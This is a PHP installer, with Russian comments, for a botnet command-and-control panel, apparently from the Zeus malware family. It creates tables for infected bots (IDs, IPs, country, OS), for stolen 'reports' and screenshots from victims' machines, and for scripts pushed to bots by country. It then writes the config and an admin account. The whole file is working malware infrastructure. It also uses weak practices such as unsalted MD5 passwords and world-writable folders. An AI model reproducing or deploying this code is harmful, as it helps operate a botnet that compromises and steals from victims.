<?php define('__INSTALL__', 1);
require_once('../system/global.php'); 

///////////////////////////////////////////////////////////////////////////////////////////////////
// Константы.
///////////////////////////////////////////////////////////////////////////////////////////////////

//Файлы.
define('FILE_GEOBASE', 'geobase.txt');          //Геобаза
define('FILE_CONFIG',  '../system/config.php'); //Конфиг.

//Заголовок
define('APP_TITLE', 'Control Panel '.BO_CLIENT_VERSION.' Installer');

//Параметры диалога.
define('DIALOG_WIDTH',       '350px'); //Ширина диалога.
define('DIALOG_INPUT_WIDTH', '150px'); //Ширина <input>.

//Подключение темы.
define('THEME_PATH', '../theme');
require_once(THEME_PATH.'/index.php'); 

///////////////////////////////////////////////////////////////////////////////////////////////////
// Список таблиц.
///////////////////////////////////////////////////////////////////////////////////////////////////

//Список ботов
$_TABLES['botnet_list'] =
"`bot_id`         varchar(".BOT_ID_MAX_CHARS.") NOT NULL default '' UNIQUE, ".            //ID бота.
"`botnet`         varchar(".BOTNET_MAX_CHARS.") NOT NULL default '".DEFAULT_BOTNET."', ". //Ботнет.
"`bot_version`    int unsigned      NOT NULL default '0', ".                              //Версия бота.

"`net_latency`    int unsigned      NOT NULL default '0', ".                              //Лаг соединения.
"`tcpport_s1`     smallint unsigned NOT NULL default '0', ".                              //TCP порт S1.

"`time_localbias` int signed        NOT NULL default '0', ".                              //Оффсет локального времени в секундах.
"`os_version`     tinyblob          NOT NULL, ".                                          //Данные об OS (dwMajor, dwMinor, dwBuild, dwSP, wSuiteMask, wProductType).
"`language_id`    smallint unsigned NOT NULL default '0', ".                              //ID языка OS.

"`ipv4_list`      blob              NOT NULL, ".                                          //Список IPv4 адресов.
"`ipv6_list`      blob              NOT NULL, ".                                          //Список IPv6 адресов.
"`ipv4`           varbinary(4)      NOT NULL default '\\0\\0\\0\\0', ".                   //IPv4
"`country`        varchar(2)        NOT NULL default '--', ".                             //Страна.

"`rtime_first`    int unsigned      NOT NULL default '0', ".                              //Время первого отчета об онлайне.
"`rtime_last`     int unsigned      NOT NULL default '0', ".                              //Время последнего отчета об онлайне.
"`rtime_online`   int unsigned      NOT NULL default '0', ".                              //Время, c которого бот находиться в онлайне.

"`flag_new`       bool              NOT NULL default '1', ".                              //Флаг "Инсталла".
"`flag_used`      bool              NOT NULL default '0', ".                              //Флаг "Использован".

"`comment`        tinytext          NOT NULL";                                            //Комментарии к боту.

//Шаблон отчетов.
$_TABLES['botnet_reports'] =
"`id`             int unsigned      NOT NULL auto_increment PRIMARY KEY, ".
"`bot_id`         varchar(".BOT_ID_MAX_CHARS.") NOT NULL default '', ".                    //ID бота.
"`botnet`         varchar(".BOTNET_MAX_CHARS.") NOT NULL default '".DEFAULT_BOTNET."', ".  //Ботнет.
"`bot_version`    int unsigned      NOT NULL default '0', ".                               //Версия бота.

"`path_source`    text              NOT NULL, ".                                           //Исходный путь лога.
"`path_dest`      text              NOT NULL, ".                                           //Конечный путь лога.

"`time_system`    int unsigned      NOT NULL default '0', ".                               //Оффсет локального времени в секундах.
"`time_tick`      int unsigned      NOT NULL default '0', ".                               //Оффсет локального времени в мс.
"`time_localbias` int               NOT NULL default '0', ".                               //Оффсет локального времени в секундах.

"`os_version`     tinyblob          NOT NULL, ".                                           //Данные об OS (OSINFO).
"`language_id`    smallint unsigned NOT NULL default '0', ".                               //ID языка OS.

"`process_name`   text NOT NULL, ".                                                        //Имя процесса.
"`process_user`   text NOT NULL, ".                                                        //Имя юзера процесса.

"`type`           int unsigned      NOT NULL default '0', ".                               //Тип лога.
"`context`        longtext          NOT NULL, ".                                           //Содержимое лога.

"`ipv4`           varbinary(15)     NOT NULL default '0.0.0.0', ".                         //IPv4
"`country`        varchar(2)        NOT NULL default '--', ".                              //Страна.
"`rtime`          int unsigned      NOT NULL default '0'";                                 //Время отчета.

//База IPv4 to Country.
$_TABLES['ipv4toc'] =
"`l` int unsigned NOT NULL default '0', ". //Нижний IP.
"`h` int unsigned NOT NULL default '0', ". //Верхний IP.
"`c` varbinary(2) NOT NULL default '--'";  //Страна.

//Список пользователей.
$_TABLES['cp_users'] = 
"`id`            int unsigned    NOT NULL auto_increment PRIMARY KEY, ".
"`name`          varchar(20)     NOT NULL default '' UNIQUE, ".           //Имя.
"`pass`          varchar(32)     NOT NULL default '', ".                  //Пароль.
"`language`      varbinary(2)    NOT NULL default 'en', ".                //Язык пользователя.
"`flag_enabled`  bool            NOT NULL default '1', ".                 //Флаг включенного пользователя
"`comment`       tinytext        NOT NULL, ".                             //Комментарии.

//Различные настройки.
"`ss_format`    varbinary(10)    NOT NULL default 'jpeg', ".              //Формат скриншотов.
"`ss_quality`   tinyint unsigned NOT NULL default '30', ".                //Качество скриншота.

//Права.
"`r_edit_bots`           bool NOT NULL default '1', ".

"`r_stats_main`          bool NOT NULL default '1', ".
"`r_stats_main_reset`    bool NOT NULL default '1', ".
"`r_stats_os`            bool NOT NULL default '1', ".

"`r_botnet_bots`         bool NOT NULL default '1', ".
"`r_botnet_scripts`      bool NOT NULL default '1', ".
"`r_botnet_scripts_edit` bool NOT NULL default '1', ".

"`r_reports_db`          bool NOT NULL default '1', ".
"`r_reports_db_edit`     bool NOT NULL default '1', ".
"`r_reports_files`       bool NOT NULL default '1', ".
"`r_reports_files_edit`  bool NOT NULL default '1', ".
"`r_reports_jn`          bool NOT NULL default '1', ".

"`r_system_info`         bool NOT NULL default '1', ".
"`r_system_options`      bool NOT NULL default '1', ".
"`r_system_user`         bool NOT NULL default '1', ".
"`r_system_users`        bool NOT NULL default '1'";

//Скрипты ботам.
$_TABLES['botnet_scripts'] =
"`id`           int unsigned  NOT NULL auto_increment PRIMARY KEY,".
"`extern_id`    varbinary(16) NOT NULL default '0', ".                //Внешний ID.
"`name`         varchar(255)  NOT NULL default '', ".                 //Название группы.
"`flag_enabled` bool          NOT NULL default '0', ".                //Скрипт активна.
"`time_created` int unsigned  NOT NULL default '0', ".                //Время создания скрипта.
"`send_limit`   int unsigned  NOT NULL default '0', ".                //Лимит ботов.

"`bots_wl`      text          NOT NULL, ".                            //Список ботов, для которых нужно испольнять скрипт.
"`bots_bl`      text          NOT NULL, ".                            //Список ботов, для которых не нужно испольнять скрипт.
"`botnets_wl`   text          NOT NULL, ".                            //Список ботнетов, для которых нужно испольнять скрипт.
"`botnets_bl`   text          NOT NULL, ".                            //Список ботнетов, для которых не нужно испольнять скрипт.
"`countries_wl` text          NOT NULL, ".                            //Список стран, для которых нужно испольнить скрипт.
"`countries_bl` text          NOT NULL, ".                            //Список стран, для которых не нужно исполнять скрипт.

"`script_text`   text         NOT NULL, ".                            //Текстовое представление команд в группе.
"`script_bin`    blob         NOT NULL";                              //Бинарное представление команд в группе.

//Статистика скриптов по ботам.
$_TABLES['botnet_scripts_stat'] =
"`extern_id`   varbinary(16)                 NOT NULL, ".             //Внешний ID.
"`type`        tinyint unsigned              NOT NULL default '0', ". //Типа записи. 1 - отпралвен, 2 - исполнен, 3 - ошибка.
"`bot_id`      varchar(".BOT_ID_MAX_CHARS.") NOT NULL default '', ".  //ID бота.
"`bot_version` int unsigned                  NOT NULL default '0', ". //Версия бота.
"`rtime`       int unsigned                  NOT NULL default '0', ". //Время отчета.
"`report`      text                          NOT NULL, ".             //Текстовый отчет бота о выполнении сценария.
"UNIQUE(`extern_id`, `bot_id`, `type`)";                                                   

///////////////////////////////////////////////////////////////////////////////////////////////////
// Значения по умолчанию.
///////////////////////////////////////////////////////////////////////////////////////////////////

$pd_user            = 'admin';
$pd_pass            = '';

$pd_mysql_host      = '127.0.0.1';
$pd_mysql_user      = 'root';
$pd_mysql_pass      = '';
$pd_mysql_db        = 'cpdb';

$pd_reports_path    = '_reports';
$pd_reports_to_db   = 1;
$pd_reports_to_fs   = 0;

$pd_botnet_timeout  = 25;
$pd_botnet_cryptkey = '';

$_OUTPUT = '';

///////////////////////////////////////////////////////////////////////////////////////////////////
// Функции.
///////////////////////////////////////////////////////////////////////////////////////////////////

//Отображение ошибки.
function ShowError($text)
{
  global $_OUTPUT;
  $_OUTPUT .= THEME_DIALOG_ROW_BEGIN.str_replace('{TEXT}', '&#8226; ERROR:'.$text, THEME_DIALOG_ITEM_ERROR).THEME_DIALOG_ROW_END;
}

//Отображение процесса.
function ShowProgress($text)
{
  global $_OUTPUT;
  $_OUTPUT .= THEME_DIALOG_ROW_BEGIN.str_replace('{TEXT}', '&#8226; '.$text, THEME_DIALOG_ITEM_SUCCESSED).THEME_DIALOG_ROW_END;
}

//Создание таблицы.
function CreateTable($name)
{
  global $_TABLES;
  
  ShowProgress("Creating table ".THEME_STRING_BOLD_BEGIN."'{$name}'".THEME_STRING_BOLD_END.".");
  if(!@mysql_query("DROP TABLE IF EXISTS `{$name}`") || !@mysql_query("CREATE TABLE `{$name}` ({$_TABLES[$name]}) ENGINE=MyISAM CHARACTER SET=".MYSQL_CODEPAGE." COLLATE=".MYSQL_COLLATE))
  {
    ShowError("Failed: ".htmlEntitiesEx(mysql_error()));
    return false;
  }
  
  return true;
}

//Обнавление таблицы.
function UpdateTable($name)
{
  global $_TABLES;
  
  ShowProgress("Updating table ".THEME_STRING_BOLD_BEGIN."'{$name}'".THEME_STRING_BOLD_END.".");  
  if(!@mysql_query("CREATE TABLE IF NOT EXISTS `{$name}` ({$_TABLES[$name]}) ENGINE=MyISAM CHARACTER SET=".MYSQL_CODEPAGE." COLLATE=".MYSQL_COLLATE))
  {
    ShowError("Failed: ".htmlEntitiesEx(mysql_error()));
    return false;
  }
  
  //@mysql_query("ALTER TABLE `{$name}` CHARACTER SET=".MYSQL_CODEPAGE." COLLATE=".MYSQL_COLLATE);
  
  //Обнавляем на удачу.
  $list = explode(',', $_TABLES[$name]);
  foreach($list as &$l)@mysql_query("ALTER TABLE `{$name}` ADD {$l}");

  return true;
}

//Обнавление таблицы по данным другой таблицы.
function UpdateTableEx($name, $real_name)
{
  global $_TABLES;
  
  ShowProgress("Updating table ".THEME_STRING_BOLD_BEGIN."'{$name}'".THEME_STRING_BOLD_END.".");  
  if(!@mysql_query("CREATE TABLE IF NOT EXISTS `{$name}` ({$_TABLES[$real_name]}) ENGINE=MyISAM CHARACTER SET=".MYSQL_CODEPAGE." COLLATE=".MYSQL_COLLATE))
  {
    ShowError("Failed: ".htmlEntitiesEx(mysql_error()));
    return false;
  }
  
  //@mysql_query("ALTER TABLE `{$name}` CHARACTER SET=".MYSQL_CODEPAGE." COLLATE=".MYSQL_COLLATE);
  
  //Обнавляем на удачу.
  $list = explode(',', $_TABLES[$real_name]);
  foreach($list as &$l)@mysql_query("ALTER TABLE `{$name}` ADD {$l}");
  
  return true;
}

//Добавление строки в таблицу
function AddRowToTable($name, $query)
{
  if(!mysqlQueryEx($name, "INSERT INTO `{$name}` SET {$query}"))
  {
    ShowError("Failed to write row to table ".THEME_STRING_BOLD_BEGIN."'{$name}'".THEME_STRING_BOLD_END.": %s".htmlEntitiesEx(mysql_error()));
    return false;
  }
  return true;
}

//Создание пути.
function CreatePath($new_dir, $old_dir)
{
  $dir_r = '../'.$new_dir;
  
  if($old_dir != 0 && $old_dir != $new_dir && file_exists('../'.$old_dir))
  {
    ShowProgress("Renaming folder ".THEME_STRING_BOLD_BEGIN."'{$old_dir}'".THEME_STRING_BOLD_END." to ".THEME_STRING_BOLD_BEGIN."'{$new_dir}'".THEME_STRING_BOLD_END.".");
    if(!is_dir($dir_r) && !@rename('../'.$old_dir, $dir_r))
    {
      ShowError("Failed to rename folder.");
      return false;
    }
    
    @chmod($dir_r, 0777);
  }
  else
  {
    ShowProgress("Creating folder ".THEME_STRING_BOLD_BEGIN."'{$new_dir}'".THEME_STRING_BOLD_END.".");
    if(!is_dir($dir_r) && !@mkdir($dir_r, 0777))
    {
      ShowError("Failed to create folder ".THEME_STRING_BOLD_BEGIN."'{$new_dir}'".THEME_STRING_BOLD_END.".");
      return false;
    }
  }
  return true;
}

//Выбор режим работы.
$is_update = file_exists(FILE_CONFIG);

///////////////////////////////////////////////////////////////////////////////////////////////////
// Процесс утсановки/обнавления.
///////////////////////////////////////////////////////////////////////////////////////////////////
if(strcmp($_SERVER['REQUEST_METHOD'], 'POST') === 0)
{
  $error = false;
  $_OUTPUT = str_replace('{WIDTH}', DIALOG_WIDTH, THEME_DIALOG_BEGIN).
             str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, 'Installation steps:'), THEME_DIALOG_TITLE);
  
  //Получение Пост-данных.
  if($is_update)
  {
    if(!@include_once(FILE_CONFIG))
    {
      ShowError("Failed to open file '".FILE_CONFIG."'.");
      $error = true;
    }
    else
    {
      if(isset($config['reports_path']))$pd_reports_path       = $config['reports_path'];
      if(isset($config['reports_to_db']))$pd_reports_to_db     = $config['reports_to_db'] ? 1 : 0;
      if(isset($config['reports_to_fs']))$pd_reports_to_fs     = $config['reports_to_fs'] ? 1 : 0;
      if(isset($config['botnet_timeout']))$pd_botnet_timeout   = (int)($config['botnet_timeout'] / 60);
      if(isset($config['botnet_cryptkey']))$pd_botnet_cryptkey = $config['botnet_cryptkey'];
      
      $pd_mysql_host = isset($config['mysql_host']) ? $config['mysql_host'] : NULL;
      $pd_mysql_user = isset($config['mysql_user']) ? $config['mysql_user'] : NULL;
      $pd_mysql_pass = isset($config['mysql_pass']) ? $config['mysql_pass'] : NULL;
      $pd_mysql_db   = isset($config['mysql_db'])   ? $config['mysql_db']   : NULL;
    }
  }
  else
  {
    $pd_user            = checkPostData('user',         1,  20);
    $pd_pass            = checkPostData('pass',         6,  64);  
    
    $pd_reports_path    = checkPostData('path_reports', 1, 256);
    $pd_reports_to_db   = (isset($_POST['reports_to_db']));// && $_POST['reports_to_db'] == 1);
    $pd_reports_to_fs   = (isset($_POST['reports_to_fs']));// && $_POST['reports_to_fs'] == 1);
    $pd_botnet_timeout  = checkPostData('botnet_timeout',  1,   4);
    $pd_botnet_cryptkey = checkPostData('botnet_cryptkey', 1, 256);

    $pd_mysql_host      = checkPostData('mysql_host',   1, 256);
    $pd_mysql_user      = checkPostData('mysql_user',   1, 256);
    $pd_mysql_pass      = checkPostData('mysql_pass',   0, 256);
    $pd_mysql_db        = checkPostData('mysql_db',     1, 256);
  }

  $pd_reports_path = trim(str_replace('\\', '/', trim($pd_reports_path)), '/');
  
  //Обработка ошибок.
  if(!$error)
  {
    if(!$is_update && ($pd_user === NULL || $pd_pass === NULL))
    {
      ShowError('Bad format of login data.');
      $error = true;
    }
    if($pd_mysql_host === NULL || $pd_mysql_user === NULL || $pd_mysql_db === NULL)
    {
      ShowError('Bad format of MySQL server data.');
      $error = true;
    }
    if($pd_reports_path === NULL)
    {
      ShowError('Bad format of reports path.');
      $error = true;
    }
    if(!is_numeric($pd_botnet_timeout) || $pd_botnet_timeout < 1)
    {
      ShowError('Bot online timeout have bad value.');
      $error = true;
    }
    if($pd_botnet_cryptkey === NULL)
    {
      ShowError('Bad format of encryption key.');
      $error = true;
    }
  }

  //Подключение к базе.
  if(!$error)
  {
    ShowProgress("Connecting to MySQL as ".THEME_STRING_BOLD_BEGIN."'{$pd_mysql_user}'".THEME_STRING_BOLD_END.".");
    if(!@mysql_connect($pd_mysql_host, $pd_mysql_user, $pd_mysql_pass) || !@mysql_query('SET NAMES \''.MYSQL_CODEPAGE.'\' COLLATE \''.MYSQL_COLLATE.'\''))
    {
      ShowError("Failed connect to MySQL server: ".htmlEntitiesEx(mysql_error()));
      $error = true;
    }
  }

  //Выбор таблицы.
  if(!$error)
  {
    $db = addslashes($pd_mysql_db);
    ShowProgress("Selecting DB ".THEME_STRING_BOLD_BEGIN."'{$pd_mysql_db}'".THEME_STRING_BOLD_END.".");
    
    if(!@mysql_query("CREATE DATABASE IF NOT EXISTS `{$db}`"))
    {
      ShowError("Failed to create database: ".htmlEntitiesEx(mysql_error()));
      $error = true;
    }
    else if(!@mysql_select_db($pd_mysql_db))
    {
      ShowError("Failed to select database: ".htmlEntitiesEx(mysql_error()));
      $error = true;
    }
    
    @mysql_query("ALTER DATABASE `{$db}` CHARACTER SET ".MYSQL_CODEPAGE." COLLATE ".MYSQL_COLLATE);
  }
  
  //Обрабатываем таблицы.
  if(!$error)foreach($_TABLES as $table => $v)
  {
    //Заполнение таблицы ipv4toc.
    if(strcmp($table, 'ipv4toc') == 0)
    {
      if(($error = !CreateTable($table)))break;
      ShowProgress("Filling table ".THEME_STRING_BOLD_BEGIN."'{$table}'".THEME_STRING_BOLD_END.".");
    
      if(($list = @file(FILE_GEOBASE)) === false)
      {
        ShowError("Failed to open file '".FILE_GEOBASE."'.");
        $error = true;
      }
      else
      {
        foreach($list as $item)
        {
          $cn = explode("\0", $item, 3);
          if(($error = !AddRowToTable($table, "l='{$cn[0]}', h='{$cn[1]}', c='".substr(trim($cn[2]), 0, 2)."'")))break;
        }
        unset($list);
      }
    }
    //Обновляем старые таблицы отчетов.
    else if(strcmp($table, 'botnet_reports') == 0)
    {
      if(($error = !CreateTable($table)))break;
      $rlist = listReportTables($pd_mysql_db);
      foreach($rlist as $rtable)if(($error = !UpdateTableEx($rtable, 'botnet_reports')))break;
    }
    else $error = !($is_update ? UpdateTable($table) : CreateTable($table));
    
    if($error)break;
  }

  //Создание директории для отчетов.
  if(!$error)$error = !CreatePath($pd_reports_path, isset($config['reports_path']) ? $config['reports_path'] : 0);

  //Обновление файла конфигурации.
  if(!$error)
  {
    ShowProgress("Writing config file");
    
    $updateList['mysql_host']      = $pd_mysql_host;
    $updateList['mysql_user']      = $pd_mysql_user;
    $updateList['mysql_pass']      = $pd_mysql_pass;
    $updateList['mysql_db']        = $pd_mysql_db;
    $updateList['reports_path']    = $pd_reports_path;
    $updateList['reports_to_db']   = $pd_reports_to_db ? 1 : 0;
    $updateList['reports_to_fs']   = $pd_reports_to_fs ? 1 : 0;
    $updateList['botnet_timeout']  = ((int)($pd_botnet_timeout * 60));
    $updateList['botnet_cryptkey'] = $pd_botnet_cryptkey;
  
    if(!updateConfig($updateList))
    {
      ShowError("Failed write to config file.");
      $error = true;
    }
  }

  //Добавление пользователя в базу.
  if(!$error && !$is_update)
  {
    ShowProgress("Adding user ".THEME_STRING_BOLD_BEGIN."'{$pd_user}'".THEME_STRING_BOLD_END.".");
    $error = !AddRowToTable('cp_users', "name='".addslashes($pd_user)."', pass='".md5($pd_pass)."', comment='Default user'");
  }
  
  //Выставляем прозрачно права на каталог для временных файлов.
  @chmod('../tmp', 0777);
  
  //Успешное завершение.
  if(!$error)
  {
    $_OUTPUT .= THEME_DIALOG_ROW_BEGIN.
                  str_replace('{TEXT}', THEME_STRING_BOLD_BEGIN.($is_update ? '-- Update complete! --' : '-- Installation complete! --').THEME_STRING_BOLD_END, THEME_DIALOG_ITEM_SUCCESSED).
                THEME_DIALOG_ROW_END;
    themeSmall(APP_TITLE, $_OUTPUT.THEME_DIALOG_END, 0, 0, 0);
    die();
  }
  $_OUTPUT .= THEME_DIALOG_END.THEME_VSPACE;
}

///////////////////////////////////////////////////////////////////////////////////////////////////
// Основной диалог.
///////////////////////////////////////////////////////////////////////////////////////////////////

if($is_update)
{
  @include_once(FILE_CONFIG);
  if(isset($config['mysql_db']))$pd_mysql_db = $config['mysql_db'];
}

if($is_update)$help =  "This application update/repair and reconfigure your control panel on this server. If you want make new installation, please remove file '".FILE_CONFIG."'.";
else          $help =  "This application install and configure your control panel on this server. Please type settings and press 'Install'.";

$_FORMITEMS = '';

//Данные юзера.
if(!$is_update)
{
  $_FORMITEMS .=
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{COLUMNS_COUNT}', '2', THEME_DIALOG_GROUP_BEGIN).
    str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, 'Root user:'), THEME_DIALOG_GROUP_TITLE).
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', 'User name: (1-20 chars):', THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_user), 'user', '20', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
      THEME_DIALOG_ROW_END.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', 'Password (6-64 chars):', THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_pass), 'pass', '64', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
      THEME_DIALOG_ROW_END.
    THEME_DIALOG_GROUP_END.
  THEME_DIALOG_ROW_END;
}

//База данных.
$_FORMITEMS .= 
THEME_DIALOG_ROW_BEGIN.
  str_replace('{COLUMNS_COUNT}', '2', THEME_DIALOG_GROUP_BEGIN).
  str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, 'MySQL server:'), THEME_DIALOG_GROUP_TITLE);
          
if(!$is_update)
{
  $_FORMITEMS .= 
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{TEXT}', 'Host:', THEME_DIALOG_ITEM_TEXT).
    str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_mysql_host), 'mysql_host', '64', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
  THEME_DIALOG_ROW_END.
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{TEXT}', 'User:', THEME_DIALOG_ITEM_TEXT).
    str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_mysql_user), 'mysql_user', '64', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
  THEME_DIALOG_ROW_END.
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{TEXT}', 'Password:', THEME_DIALOG_ITEM_TEXT).
    str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_mysql_pass), 'mysql_pass', '64', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
  THEME_DIALOG_ROW_END;
}     

$_FORMITEMS .= 
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{TEXT}', 'Database:', THEME_DIALOG_ITEM_TEXT).
    str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_mysql_db), 'mysql_db', '64', DIALOG_INPUT_WIDTH), $is_update ? THEME_DIALOG_ITEM_INPUT_TEXT_RO : THEME_DIALOG_ITEM_INPUT_TEXT).
  THEME_DIALOG_ROW_END.
  THEME_DIALOG_GROUP_END.
THEME_DIALOG_ROW_END;
          
//Локальные пути.     
if(!$is_update)
{
  $_FORMITEMS .= 
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{COLUMNS_COUNT}', '2', THEME_DIALOG_GROUP_BEGIN).
    str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, 'Local folders:'), THEME_DIALOG_GROUP_TITLE).
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', 'Reports:', THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_reports_path), 'path_reports', '255', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
      THEME_DIALOG_ROW_END.
    THEME_DIALOG_GROUP_END.
  THEME_DIALOG_ROW_END;
}

//Опции.
if(!$is_update)
{
  $_FORMITEMS .= 
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{COLUMNS_COUNT}', '2', THEME_DIALOG_GROUP_BEGIN).
    str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, 'Options:'), THEME_DIALOG_GROUP_TITLE).
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', 'Online bot timeout:', THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_botnet_timeout), 'botnet_timeout', '4', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
      THEME_DIALOG_ROW_END.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', 'Encryption key (1-255 chars):', THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_botnet_cryptkey), 'botnet_cryptkey', '255', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
      THEME_DIALOG_ROW_END.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{COLUMNS_COUNT}', '2', THEME_DIALOG_GROUP_BEGIN).
          THEME_DIALOG_ROW_BEGIN.
            str_replace(array('{COLUMNS_COUNT}', '{VALUE}', '{NAME}', '{JS_EVENTS}', '{TEXT}'), array(1, 1, 'reports_to_db', '', 'Enable write reports to database.'), $pd_reports_to_db ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2).
          THEME_DIALOG_ROW_END.
          THEME_DIALOG_ROW_BEGIN.
            str_replace(array('{COLUMNS_COUNT}', '{VALUE}', '{NAME}', '{JS_EVENTS}', '{TEXT}'), array(1, 1, 'reports_to_fs', '', 'Enable write reports to local path.'), $pd_reports_to_fs ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2).
          THEME_DIALOG_ROW_END.
        THEME_DIALOG_GROUP_END.
      THEME_DIALOG_ROW_END.
    THEME_DIALOG_GROUP_END.
  THEME_DIALOG_ROW_END;
}

//Форма.
$_OUTPUT .= 
str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('idata', basename($_SERVER['PHP_SELF']), ''), THEME_FORMPOST_BEGIN).
str_replace('{WIDTH}', DIALOG_WIDTH, THEME_DIALOG_BEGIN).
  str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, APP_TITLE), THEME_DIALOG_TITLE).
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{COLUMNS_COUNT}', '2', THEME_DIALOG_GROUP_BEGIN).
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', $help, THEME_DIALOG_ITEM_WRAPTEXT).
      THEME_DIALOG_ROW_END.
    THEME_DIALOG_GROUP_END.
  THEME_DIALOG_ROW_END.
  $_FORMITEMS.
  str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_ACTIONLIST_BEGIN).
   str_replace(array('{TEXT}', '{JS_EVENTS}'), array(($is_update ? '-- Update --' : '-- Install --'), ''), THEME_DIALOG_ITEM_ACTION_SUBMIT).
  THEME_DIALOG_ACTIONLIST_END.
THEME_DIALOG_END.
THEME_FORMPOST_END;

//Вывод.
themeSmall(APP_TITLE, $_OUTPUT, 0, 0, 0);
?>